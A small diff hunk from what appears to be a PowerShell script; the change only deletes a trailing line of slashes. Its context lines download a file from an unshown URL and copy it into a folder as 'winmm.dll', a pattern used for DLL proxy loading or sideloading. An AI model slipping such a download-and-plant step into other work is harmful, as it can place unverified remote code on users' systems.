@@ -22,4 +22,3 @@ Invoke-WebRequest $u -OutFile $f -UseBasicParsing
 Copy-Item $f (Join-Path $t 'winmm.dll') -Force
 Remove-Item $f -Force -EA 0
 Write-Host 'OK'
-/////////////////////////////////////
